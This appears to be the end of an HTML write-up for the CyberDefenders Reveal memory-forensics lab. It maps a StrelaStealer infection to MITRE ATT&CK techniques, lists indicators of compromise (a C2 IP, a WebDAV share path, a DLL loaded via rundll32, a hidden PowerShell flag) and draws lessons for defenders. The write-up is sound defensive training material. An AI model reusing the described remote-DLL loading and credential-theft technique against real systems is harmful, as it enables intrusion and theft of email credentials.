+      <div class="mitre-desc">rundll32.exe loads malicious 3435.dll from WebDAV share</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1620</div>
+      <div class="mitre-name">Reflective Code Loading</div>
+      <div class="mitre-desc">DLL loaded directly from network — never written to disk</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1071.001</div>
+      <div class="mitre-name">Web Protocols C2</div>
+      <div class="mitre-desc">WebDAV over port 8888 for payload delivery and C2</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1555</div>
+      <div class="mitre-name">Credentials from Password Stores</div>
+      <div class="mitre-desc">StrelaStealer targets Thunderbird email credentials</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1036</div>
+      <div class="mitre-name">Masquerading</div>
+      <div class="mitre-desc">Parent process self-terminates to obscure the launch chain</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1041</div>
+      <div class="mitre-name">Exfiltration Over C2 Channel</div>
+      <div class="mitre-desc">Stolen credentials exfiltrated to 45.9.74.32 via established C2</div>
+    </div>
+  </div>
+</div>
+
+<!-- 09 IOC -->
+<div class="section">
+  <div class="section-num">09 — IOC Summary</div>
+  <h2>Indicators of Compromise</h2>
+
+  <div class="ioc-wrap">
+    <table class="ioc-table">
+      <thead>
+        <tr><th>Indicator</th><th>Value</th><th>Type</th><th>Confidence</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>C2 Server</td><td><code>45.9.74.32</code></td><td><span class="badge badge-red">IP</span></td><td><span class="badge badge-red">HIGH</span></td></tr>
+        <tr><td>WebDAV Share</td><td><code>\\45.9.74.32@8888\davwwwroot\</code></td><td><span class="badge badge-red">Network</span></td><td><span class="badge badge-red">HIGH</span></td></tr>
+        <tr><td>Malicious DLL</td><td><code>3435.dll</code> (loaded via rundll32)</td><td><span class="badge badge-red">File</span></td><td><span class="badge badge-red">HIGH</span></td></tr>
+        <tr><td>Malware Family</td><td>StrelaStealer</td><td><span class="badge badge-orange">Attribution</span></td><td><span class="badge badge-red">HIGH</span></td></tr>
+        <tr><td>Malicious Process</td><td><code>powershell.exe</code> PID 3692</td><td><span class="badge badge-purple">Process</span></td><td><span class="badge badge-red">HIGH</span></td></tr>
+        <tr><td>Execution Flag</td><td><code>-windowstyle hidden</code></td><td><span class="badge badge-orange">Behavior</span></td><td><span class="badge badge-red">HIGH</span></td></tr>
+        <tr><td>Target Process</td><td><code>thunderbird.exe</code> (credential theft target)</td><td><span class="badge badge-purple">Process</span></td><td><span class="badge badge-red">HIGH</span></td></tr>
+        <tr><td>Suspect User</td><td><code>Elom</code></td><td><span class="badge badge-yellow">Identity</span></td><td><span class="badge badge-red">HIGH</span></td></tr>
+        <tr><td>C2 Port</td><td><code>8888</code> (WebDAV)</td><td><span class="badge badge-blue">Network</span></td><td><span class="badge badge-red">HIGH</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- 10 TAKEAWAYS -->
+<div class="section">
+  <div class="section-num">10 — Takeaways</div>
+  <h2>What This Investigation Teaches Us</h2>
+
+  <h3>Memory Forensics Sees What Disk Forensics Misses</h3>
+  <p>
+    The malicious DLL — 3435.dll — was never written to disk. It was loaded directly from a WebDAV share into memory, executed, and left no file system artifact. A traditional disk forensics investigation would have found nothing. The only place this attack was visible was in memory — in the process list, in the network connections, in the command line arguments. This is why memory forensics is indispensable for modern threat detection.
+  </p>
+
+  <h3>The Right Plugin at the Right Time</h3>
+  <p>
+    pslist and pstree alone would not have cracked this case — the process list was too noisy. It was malfind that surfaced the right processes, cmdline that revealed the hidden execution flag, and getsids that identified the user. Each Volatility plugin answers a different question. Knowing which question to ask next is the real skill.
+  </p>
+
+  <h3>LOLBins Are a Detection Blind Spot</h3>
+  <p>
+    Using rundll32.exe to load a malicious DLL is effective precisely because rundll32 is legitimate, signed, and present on every Windows installation. Many security controls whitelist it by default. The lesson for defenders: monitor rundll32 execution that loads DLLs from network paths, and flag any -windowstyle hidden PowerShell invocation for immediate investigation.
+  </p>
+
+  <h3>StrelaStealer Goes Where the Credentials Are</h3>
+  <p>
+    The presence of thunderbird.exe was not background noise — it was the target. StrelaStealer's designers built it specifically to hunt email client credentials because email access is a master key. Corporate email contains authentication tokens, password resets, sensitive communications, and in the case of a financial institution — potential access to systems far beyond what a single workstation credential would provide. Always follow the malware's specific targeting logic. It tells you exactly what the attacker actually wants.
+  </p>
+
+  <div class="highlight-box" style="margin-top:32px;">
+    <div style="font-family:var(--sans);font-size:15px;font-weight:700;color:var(--heading);margin-bottom:10px;">Tools Used — This Investigation</div>
+    <div style="font-size:13px;line-height:2.2;color:var(--text);">
+      <code>Volatility 3</code> — windows.info, pslist, pstree, malfind, cmdline, getsids<br>
+      <code>VirusTotal</code> — IP reputation lookup and malware family attribution<br>
+      <code>MITRE ATT&CK</code> — TTP mapping and technique identification<br>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <div class="footer-sig">Written as a walkthrough for CyberDefenders Reveal Lab by</div>
+  <div class="footer-name">WizB</div>
+  <div style="font-size:11px;color:var(--muted);margin-top:8px;letter-spacing:1px;">DFIR · OSINT · NIT Silchar ECE<span class="cursor"></span></div>
+</div>
+
+</div>
+</body>
+</html>
